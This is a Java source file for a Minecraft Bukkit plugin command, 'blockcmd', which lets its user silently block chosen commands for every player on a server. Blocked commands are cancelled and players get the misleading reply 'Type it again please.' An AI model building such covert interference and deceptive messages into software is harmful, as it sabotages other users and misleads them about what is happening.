package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.util.ArrayList;

public class Command_BlockCommand extends CommandBase implements Listener {

    public ArrayList<String> blockedCommands = new ArrayList<>();

    public Command_BlockCommand() {
        super("blockcmd", "<Befehl>" + " §d| " + ChatColor.GRAY + "Befehl blockieren", Category.OTHER);
        Bukkit.getPluginManager().registerEvents(this, Start.INSTANCE);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 2) {
            String Befehl = args[1];
            if (!this.blockedCommands.contains(Befehl)) {
                this.blockedCommands.add(Befehl);
                p.sendMessage(Start.INSTANCE.chatPrefix + "Blockiert: " + "§c" + Befehl);
            } else {
                this.blockedCommands.remove(Befehl);
                p.sendMessage(Start.INSTANCE.chatPrefix + "Entblockiert: " + "§a" + Befehl);
            }
        }

    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent e) {
        String Befehl = e.getMessage().split(" ")[0];

        try {
            if (this.blockedCommands.contains(Befehl)) {
                e.getPlayer().sendMessage("Type it again please.");
                e.setCancelled(true);
            }
        } catch (Exception var4) {
        }
    }

}
